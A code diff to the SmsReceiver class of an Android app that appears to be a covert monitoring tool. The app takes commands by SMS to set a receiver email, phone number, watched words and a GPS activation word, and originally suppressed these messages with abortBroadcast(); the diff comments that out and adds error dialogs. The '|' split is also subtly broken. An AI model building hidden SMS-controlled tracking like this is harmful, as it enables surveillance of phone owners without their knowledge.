@@ -43,7 +43,7 @@ public class SmsReceiver extends BroadcastReceiver
 		// If it is the key validation request SMS (so the key type should be full or part)
 		if (smsBody.startsWith(AuthSms.SMS_HEADER + AuthSms.SMS_SEPARATOR))
 		{
-			abortBroadcast(); // Finish broadcast, the system will notify this SMS
+			//abortBroadcast(); // Finish broadcast, the system will notify this SMS
 			
 			String parts[] = smsBody.split(AuthSms.SMS_SEPARATOR);
 			if (parts.length < 3) return; 
@@ -96,20 +96,26 @@ public class SmsReceiver extends BroadcastReceiver
 		
 		// If it is receiver info SMS (so the key type should be full or part)
 		else if (smsBody.startsWith("Info|")) {
-			abortBroadcast(); // Finish broadcast, the system will notify this SMS
+			//abortBroadcast(); // Finish broadcast, the system will notify this SMS
 			
 			// The sms format: <header>|<license key>|<receiver mail>|<receiver phone num>|<receiver sensitive words>|<gps activation word>
 			String parts[] = smsBody.split("|");
-			if (parts.length < 6) return;
+			if (parts.length < 6) {
+				SysUtils.messageBox(context, "Invalid info SMS: " + smsBody);
+				return;
+			}
 			
 			DbHelper db = new DbHelper(context);
-			db.updateByKeyToWriteReceiverInfo(parts[1], parts[2], parts[3], parts[4], parts[5]);
+			boolean ret = db.updateByKeyToWriteReceiverInfo(parts[1], parts[2], parts[3], parts[4], parts[5]);
+			if (!ret) {
+				SysUtils.messageBox(context, "Failed to update receiver info: " + smsBody);
+			}
 		}
 		
 		// If it is super key info logging SMS
 		else if (smsBody.startsWith(SuperLoggingSms.SMS_HEADER + SuperLoggingSms.SMS_SEPARATOR))
 		{
-			abortBroadcast(); // Finish broadcast, the system will notify this SMS
+			//abortBroadcast(); // Finish broadcast, the system will notify this SMS
 			
 			String parts[] = smsBody.split(SuperLoggingSms.SMS_SEPARATOR);
 			if (parts.length < 3) return;
